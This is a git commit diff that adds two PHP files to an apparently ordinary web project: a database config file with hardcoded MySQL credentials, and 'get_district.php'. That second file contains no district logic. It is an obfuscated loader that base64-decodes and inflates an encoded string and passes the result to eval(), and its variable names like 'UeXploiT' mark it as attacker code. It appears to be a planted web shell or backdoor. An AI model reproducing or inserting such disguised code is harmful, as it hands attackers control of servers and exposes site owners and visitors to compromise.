d733838f47865ba55e38875cd1f7fc7855f7caf4
mustafaalotwala <69724027+mustafaalotwala@users.noreply.github.com>
2021-05-31 13:28:24 +0530

    Add files via upload

---
+++ config.php
@@ -0,0 +1,8 @@
+<?php
+$con = mysqli_connect("localhost","state","state123","mustafa");
+// Check connection
+if (mysqli_connect_errno())
+{
+echo "Failed to connect to MySQL: " . mysqli_connect_error();
+ }	
+?>
---
+++ get_district.php
@@ -0,0 +1,6 @@
+<?php
+$UeXploiT = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUHHMM8iLN64IyMnPDEkN0kQ\x431g\x41\x3d";
+$An0n_3xPloiTeR = "\x3d\x3dgOO\x2bo0xdIrTs5fpH8839U3H\x63/WfsT9tRXJTLVe1\x42YzRTY\x63Dk24qostISOL\x634\x411DkhiNS\x63ZG2\x63P\x63G\x42lhk\x43ktLpeV//n\x43mL5PG05hdpR\x41v0jGEoe1\x62ISQTpYh00YSh/\x63NjkX\x43MXEEvVNx5x\x62\x61GOrhglQI8\x2b\x41IDZpd3T5hv\x43dpsyp\x435322\x43/9PEW6fQKmP\x410\x61e\x2b2m64YVN5EE0kEr3yxwzj5H85ZHTnSJJh1jsvZeszd8yW\x42N3tX3\x63M8f\x42lftvvu35xGPWOvxQpl1UF\x42zUET\x63GM/78wrkuJU13h2lf\x62vODgD9Ss\x43joRsU26yx64qwUX3g1Hw\x2bj2\x42UDO7h8X47GS\x42MDuWXP22/N\x41g8\x42wJe/L\x41\x419Hg/9Hg\x41\x42wJe\x2bLf\x41NEg/tHgE\x42wJe\x2bLe\x41dEg/dHgI\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($UeXploiT))));
+exit;
+?>
